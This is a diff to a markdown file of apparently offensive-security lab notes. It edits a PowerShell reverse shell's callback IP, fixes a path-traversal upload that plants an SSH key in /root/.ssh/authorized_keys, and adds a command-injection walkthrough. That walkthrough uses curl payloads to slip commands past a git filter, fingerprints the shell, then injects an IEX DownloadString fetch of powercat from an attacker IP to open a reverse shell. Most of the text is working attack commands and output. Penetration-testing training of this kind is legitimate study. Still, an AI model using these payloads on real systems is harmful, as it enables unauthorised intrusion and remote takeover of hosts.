@@ -311,7 +311,7 @@ $ nc -nlvp 4444
 
 $ pwsh
 
-> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.247",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+> $Text = '$client = New-Object System.Net.Sockets.TCPClient("222.222.222.222",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
 > $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 
@@ -379,7 +379,7 @@ Enter same passphrase again:
 $ cat fileup.pub > authorized_keys
 ```
 
-Turn Burp intercept on and upload authorized_keys to the webapp. Intercept the upload and change the filename= parameter to filename="../../../../../../../../../../roo/.ssh/authorized_keys" and Forward.
+Turn Burp intercept on and upload authorized_keys to the webapp. Intercept the upload and change the filename= parameter to filename="../../../../../../../../../../root/.ssh/authorized_keys" and Forward.
 
 Since we have no way to determine users other than root by displaying /etc/passwd, our only option is to try to SSH as root. It is important to note that, often, root does not have SSH perms.
 
@@ -392,3 +392,103 @@ $ ssh -p 2222 -i fileup root@targetwebsite.com
 
 // if you set a password for the key, use it when prompted
 ```
+
+## Command Injection
+
+Consider an application that ingests a command to clone git repositories:
+
+[git clone repository_url]  [SUBMIT]
+
+We can try to git clone https://github.com/offensive-security/exploitdb.
+
+Let's try to inject arbitrary commands! Switch to HTTP history and get a lay of the POST request structure.
+
+```
+POST /archive HTTP/1.1
+Host: 192.168.237.189:8000
+.
+.
+.
+Archive=git+clone+https%3A%2F%2Fgithub.com%2Foffensive-security%2Fexploitdb
+```
+
+We can use Curl to provide our own commands:
+
+```console
+$ curl -X POST --data 'Archive=ipconfig' http://111.111.111.111:8000/archive
+
+Command Injection detected. Aborting...%!(EXTRA string=ipconfig)  
+```
+
+A detection! Let's backtrack...
+
+```console
+$ curl -X POST --data 'Archive=git' http://111.111.111.111:8000/archive
+
+An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>] ...
+
+// git man... so we are not limited to "git clone"
+
+$ curl -X POST --data 'Archive=git version' http://111.111.111.111:8000/archive
+
+Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
+
+// web app is running Windows
+
+// %3B is URL encoding of semicolon, try to separate the commands
+
+$ curl -X POST --data 'Archive=git%3Bipconfig' http://111.111.111.111:8000/archive
+
+See 'git help git' for an overview of the system.
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192....
+
+// both were executed. filter is checking for "git" being executed or contained in the param
+```
+
+Let's try to learn what environment we are in - CMD or PowerShell?
+
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+Encoded: (dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+
+```console
+$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://111.111.111.111:8000/archive
+
+See 'git help git' for an overview of the system.
+PowerShell
+```
+
+Try for system access. Use Powercat (Kali's PS version of netcat) to create a reverse shell. 
+
+```console
+// second terminal
+
+$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+$ python3 -m http.server 80
+
+// third terminal
+
+$ nc -nlvp 4444
+```
+We can go back to the first terminal to curl. We will inject this command: (222 should be attacker ip, 111 should be target ip)
+
+IEX (New-Object System.Net.Webclient).DownloadString("http://222.222.222.222/powercat.ps1");powercat -c 222.222.222.222 -p 4444 -e powershell 
+
+Encoded: IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F222.222.222.222%2Fpowercat.ps1%22)%3Bpowercat%20-c%20222.222.222.222%20-p%204444%20-e%20powershell
+
+```console
+// first terminal
+
+$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F222.222.222.222%2Fpowercat.ps1%22)%3Bpowercat%20-c%20222.222.222.222%20-p%204444%20-e%20powershell' http://111.111.111.111:8000/archive
+```
+
+We should also inject a PS reverse shell directly instead of using Powercat.
+
